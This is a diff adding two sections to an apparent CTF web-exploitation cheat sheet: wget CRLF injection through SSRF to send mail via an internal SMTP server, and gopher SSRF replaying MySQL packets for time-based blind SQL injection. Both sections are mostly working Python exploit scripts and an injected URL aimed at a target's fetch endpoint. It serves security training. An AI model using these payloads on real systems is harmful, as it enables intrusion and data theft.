@@ -21,6 +21,8 @@
 - [Pongo2 / Go Template Injection via Path Traversal (Nullcon 2026)](#pongo2--go-template-injection-via-path-traversal-nullcon-2026)
 - [ZIP Upload with PHP Webshell (Nullcon 2026)](#zip-upload-with-php-webshell-nullcon-2026)
 - [basename() Bypass for Hidden Files (Nullcon 2026)](#basename-bypass-for-hidden-files-nullcon-2026)
+- [wget CRLF Injection for SSRF-to-SMTP (SECCON 2017)](#wget-crlf-injection-for-ssrf-to-smtp-seccon-2017)
+- [Gopher SSRF to MySQL Blind SQLi (34C3 CTF 2017, AceBear 2018)](#gopher-ssrf-to-mysql-blind-sqli-34c3-ctf-2017-acebear-2018)
 - [React Server Components Flight Protocol RCE (Ehax 2026)](#react-server-components-flight-protocol-rce-ehax-2026)
   - [Step 1 — Identify RSC via HTTP headers](#step-1--identify-rsc-via-http-headers)
   - [Step 2 — Exploit Flight deserialization for RCE](#step-2--exploit-flight-deserialization-for-rce)
@@ -458,6 +460,111 @@ curl "http://target/?view_receipt=secret_XXXXXXXX"
 ```
 
 **Key insight:** `basename()` is NOT a security function -- it only extracts the filename component. It doesn't filter hidden files (`.foo`), backup files (`file~`), or any filename without directory separators.
+
+---
+
+## wget CRLF Injection for SSRF-to-SMTP (SECCON 2017)
+
+**Pattern:** wget versions before 1.17.1 (notably 1.14, common on CentOS 7) do not sanitize CRLF characters (`%0d%0a`) in the HTTP Host header. When an SSRF allows controlling the URL that wget fetches, CRLF injection into the hostname allows injecting arbitrary protocol commands. Targeting an internal SMTP server on port 25 enables sending arbitrary emails.
+
+```text
+# CRLF-injected URL targeting internal SMTP on port 25:
+# Key: the port :25/ must come at the END to avoid "Bad port number" errors
+http://127.0.0.1%0D%0AHELO%20x%0D%0AMAIL%20FROM%3A%3Cattacker%40x.com%3E%0D%0ARCPT%20TO%3A%3Croot%3E%0D%0ADATA%0D%0ASubject%3A%20give%20me%20flag%0D%0Aabc%0D%0A.%0D%0A:25/
+```
+
+```python
+import requests
+import urllib.parse
+
+# Build the CRLF-injected SMTP conversation
+smtp_commands = "\r\n".join([
+    "HELO x",
+    "MAIL FROM:<attacker@x.com>",
+    "RCPT TO:<root>",
+    "DATA",
+    "Subject: give me flag",
+    "",
+    "Send me the flag please",
+    ".",
+])
+
+# URL-encode the SMTP commands for injection into the hostname
+encoded = urllib.parse.quote(smtp_commands, safe='')
+
+# Port must be at the end to avoid wget "Bad port number" error
+ssrf_url = f"http://127.0.0.1{encoded}:25/"
+
+# Trigger the SSRF
+requests.post("http://target/fetch", data={"url": ssrf_url})
+# wget connects to 127.0.0.1:25 and sends the SMTP commands as part of the HTTP request
+# The SMTP server processes the injected commands and delivers the email
+```
+
+**Key insight:** wget before 1.17.1 did not sanitize CRLF in the Host header. When SSRF reaches an internal SMTP service, CRLF injection enables sending arbitrary emails. Place the port at the END of the injected string to avoid "Bad port number" errors. This technique extends to any line-based protocol accessible via SSRF (FTP, Redis, memcached). See also [server-side.md](server-side.md#ssrf) for other SSRF techniques.
+
+---
+
+## Gopher SSRF to MySQL Blind SQLi (34C3 CTF 2017, AceBear 2018)
+
+**Pattern:** When SSRF allows the `gopher://` protocol, craft raw MySQL protocol packets to communicate with a local MySQL instance that uses passwordless authentication (common in CTF setups). Combine with time-based blind SQLi via `SLEEP()` to extract data.
+
+```python
+import urllib.parse
+import requests
+import time
+
+# Step 1: Capture a real MySQL session with tcpdump
+# tcpdump -i lo port 3306 -w mysql.pcap
+# Connect to MySQL normally: mysql -u root
+# Execute a simple query, then disconnect
+# Extract the client auth packet and query packet bytes from the pcap
+
+# Step 2: Build the gopher payload
+# MySQL auth packet (handshake response) - extract from pcap
+auth_packet = bytearray([
+    0x48, 0x00, 0x00, 0x01,  # packet length + sequence
+    0x85, 0xa6, 0x03, 0x00,  # client capabilities
+    # ... remaining auth packet bytes from tcpdump capture
+])
+
+# MySQL query packet
+def build_query_packet(sql):
+    payload = b'\x03' + sql.encode()  # 0x03 = COM_QUERY
+    length = len(payload)
+    # MySQL packet: 3-byte length (little-endian) + 1-byte sequence number
+    header = length.to_bytes(3, 'little') + b'\x00'
+    return header + payload
+
+# Step 3: Time-based blind extraction
+flag = ""
+for pos in range(1, 50):
+    for char in "abcdefghijklmnopqrstuvwxyz0123456789_{}-":
+        query = f"SELECT IF(SUBSTRING((SELECT flag FROM secrets LIMIT 1),{pos},1)='{char}',SLEEP(3),0)"
+        query_packet = build_query_packet(query)
+
+        # Combine auth + query, URL-encode for gopher
+        raw_data = bytes(auth_packet) + bytes(query_packet)
+        encoded = urllib.parse.quote(raw_data, safe='')
+
+        # Double-encode if the SSRF handler URL-decodes once
+        double_encoded = urllib.parse.quote(encoded, safe='')
+
+        gopher_url = f"gopher://127.0.0.1:3306/_{double_encoded}"
+
+        start = time.time()
+        requests.get("http://target/fetch", params={"url": gopher_url})
+        elapsed = time.time() - start
+
+        if elapsed > 3.0:
+            flag += char
+            print(f"Flag so far: {flag}")
+            break
+
+print(f"Final flag: {flag}")
+```
+
+**Key insight:** `gopher://` sends raw TCP data, enabling communication with any TCP service. Capture a legitimate MySQL session with `tcpdump`, then replay the auth + query bytes via gopher. Use passwordless MySQL accounts (common in CTF setups). Double-URL-encode the payload when the SSRF handler URL-decodes once. This technique also works against PostgreSQL, Redis, and other TCP services accessible from the SSRF context. See also [sql-injection.md](sql-injection.md) for SQL injection techniques.
 
 ---
 
